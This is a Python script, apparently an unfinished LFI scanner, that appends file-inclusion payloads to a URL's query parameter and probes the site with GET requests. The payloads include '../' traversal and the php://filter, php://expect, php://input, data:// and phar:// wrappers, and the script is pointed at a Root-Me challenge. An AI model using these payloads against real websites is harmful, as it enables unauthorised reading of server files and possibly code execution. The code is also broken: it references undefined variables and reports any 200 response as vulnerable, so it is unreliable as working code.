#!/usr/bin/env python3

import os, sys
import re
import requests
import threading
from Crawler import Crawler
import getopt

payloads = {
    "../": "../",
    "b64encode"        : "php://filter/convert.base64-encode/resource=",
    "b64decode"        : "php://filter/convert.base64-decode/resource=",
    "rot13"            : "php://filter/read=string.rot13/resource=",
    "utf-16"           : "php://filter/convert.iconv.utf-8.utf-16/resource=",
    "expect"           : "php://expect/",
    "input"            : "php://input",
    "data://"          : "data://text/plain;base64,",
    "zip://"           : "zip://",
    "phar://"          : "phar://"
}

errors = [
    "Warning: file_exists()",
    "Warning: include()",
    "failed to open stream"    
]


def usage():
    print("Usage: ./lfiscan.py [option] [argument]")
    print("Options:")
    print("--url <url>            : URL of the website")
    print("--scan                 : Crawl the website to search for vulnerable URLs")
    print("--test                 : Tests an URL for LFI")
    print("--inject [type] [opts] : Executes LFI Injection on vulnerable URL")
    print("k,")


def injectable(url):
    regex = re.compile('\?[a-zA-Z0-9]{1,}=')
    if regex.search(url):
        return True
    return False

def strip(url):
    if injectable(url):
        regex = re.compile('\?[a-zA-Z0-9]{1,}=')
        idx = re.findall(regex, url)
        return ''.join([url.split(idx[0])[0], idx[0]])
    else:
        print("Erreur, l'url rentrée n'est pas au bon format.")
        return ""

def test(url):
    if injectable(url):
        for test in payloads:
            payload = craftPayload(strip(url), payloads[test])
            if inject(payload):
                print("Payload:", payload)
    else:
        print("The url may not be injectable")

def craftPayload(url, *args):
    if len(args) == 1:
        return url + args[0]
    else:
        return url + itype + resource 
        
#lfiscan.py --inject --resource=index.php 
def inject(payload):
    if re.search('zip://', payload) or re.search('php://input', payload) or re.search('phar://', payload):
        pass
    else:
        r = requests.get(payload)
        if r.status_code == 200:
            vuln = False
            for error in errors:
                if error in r.text:
                    vuln = True
            print("Website might be vulnerable.")
            print("Try injecting with --inject [url] [ressource]\n")
            return True
        elif r.status_code == 403:
            print("Website might be vulnerable: returned", r.status_code, "\n")
            return True
        elif r.status_code == 301 or r.status_code == 302:
            print("Website might be vulnerable: returned", r.status_code, "\n")
            return False
            

if __name__ == '__main__': #NOTE: THIS IS ONLY FOR TESTING, WILL SOON USE GETOPT
    test("http://challenge01.root-me.org/web-serveur/ch16/?files=coding")
        